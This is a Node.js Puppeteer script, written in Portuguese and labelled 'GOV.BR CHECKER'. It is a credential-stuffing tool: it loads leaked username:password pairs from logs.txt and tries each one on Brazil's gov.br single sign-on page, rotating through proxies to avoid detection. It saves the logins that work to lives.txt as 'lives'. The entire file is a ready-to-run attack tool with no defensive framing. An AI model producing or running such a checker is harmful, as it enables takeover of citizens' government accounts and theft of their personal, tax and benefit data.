const fs = require("fs");
const puppeteer = require("puppeteer");

class ProxySystem {
    constructor() {
        this.proxies = [];
        this.currentIndex = 0;
    }
    
    carregarProxies() {
        try {
            if (fs.existsSync("proxies.txt")) {
                const data = fs.readFileSync("proxies.txt", "utf8");
                this.proxies = data.split('\n')
                    .map(p => p.trim())
                    .filter(p => p && !p.startsWith('#'));
                console.log(`📦 ${this.proxies.length} proxies carregados`);
            } else {
                console.log("⚠️  Arquivo proxies.txt não encontrado, usando conexão direta");
            }
        } catch (error) {
            console.log("⚠️  Erro ao carregar proxies, usando direto");
        }
        return this;
    }
    
    getProxy() {
        if (this.proxies.length === 0) return null;
        
        const proxy = this.proxies[this.currentIndex];
        this.currentIndex = (this.currentIndex + 1) % this.proxies.length;
        return proxy;
    }
}

async function delay(ms) {
    return new Promise(res => setTimeout(res, ms));
}

async function tentarLoginGovBR(usuario, senha, proxy = null) {
    const configNavegador = { 
        headless: true, 
        defaultViewport: null,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    };
    
    if (proxy) {
        configNavegador.args.push(`--proxy-server=${proxy}`);
        console.log(`🌐 Usando proxy: ${proxy}`);
    }
    
    const navegador = await puppeteer.launch(configNavegador);
    const page = await navegador.newPage();

    try {
        await page.goto("https://sso.acesso.gov.br/login", {
            waitUntil: "networkidle2",
            timeout: 60000
        });

        await page.waitForSelector("#accountId", { timeout: 15000 });
        
        await page.type("#accountId", usuario, { delay: 50 });
        await page.click("#enter-account");
        
        await delay(3000);
        
        const senhaSelector = "#password";
        const senhaExiste = await page.$(senhaSelector).catch(() => null);
        
        if (!senhaExiste) {
            await navegador.close();
            return false;
        }
        
        await page.type(senhaSelector, senha, { delay: 50 });
        await page.click("#enter-password");
        
        await delay(6000);
        
        const urlAtual = page.url();
        
        if (urlAtual.includes("login") || urlAtual.includes("sso")) {
            await navegador.close();
            return false;
        }
        
        await navegador.close();
        return true;
        
    } catch (error) {
        await navegador.close();
        return false;
    }
}

(async () => {
    console.log("🔐 GOV.BR CHECKER");
    
    const proxySystem = new ProxySystem().carregarProxies();
    
    if (!fs.existsSync("logs.txt")) {
        console.error("❌ Arquivo logs.txt não encontrado!");
        console.log("Crie um arquivo logs.txt com formato: usuario:senha");
        process.exit(1);
    }
    
    const logins = fs.readFileSync("logs.txt", "utf8")
        .split('\n')
        .filter(l => l.trim())
        .map(l => {
            const [usuario, senha] = l.split(':').map(s => s.trim());
            return { usuario, senha, original: l };
        })
        .filter(l => l.usuario && l.senha);
    
    console.log(`\n📦 ${logins.length} logins carregados`);
    console.log("⚡ Iniciando verificação...\n");
    
    const livesFile = "lives.txt";
    fs.writeFileSync(livesFile, "");
    
    let validoCount = 0;
    let testeCount = 0;
    
    for (let cred of logins) {
        testeCount++;
        const { usuario, senha, original } = cred;
        
        console.log(`[${testeCount}/${logins.length}] Testando: ${usuario}`);
        
        const proxy = proxySystem.getProxy();
        
        const valido = await tentarLoginGovBR(usuario, senha, proxy);
        
        if (valido) {
            validoCount++;
            console.log(`   ✅ LIVE: ${usuario}:${senha}`);
            fs.appendFileSync(livesFile, `${original}\n`);
        } else {
            console.log(`   ❌ DIE: ${usuario}`);
        }
        
        await delay(2000);
    }
    
    console.log("🏁 VERIFICAÇÃO CONCLUÍDA");
    console.log(`✅ Logins válidos: ${validoCount}`);
    console.log(`❌ Logins inválidos: ${logins.length - validoCount}`);
    console.log(`💾 Lives salvos em: ${livesFile}`);
    console.log("");
    
    const stats = {
        total: logins.length,
        lives: validoCount,
        dies: logins.length - validoCount,
        date: new Date().toISOString(),
        withProxy: proxySystem.proxies.length > 0
    };
    
    fs.writeFileSync("stats.json", JSON.stringify(stats, null, 2));
    console.log("📊 Estatísticas salvas em stats.json");
    
})();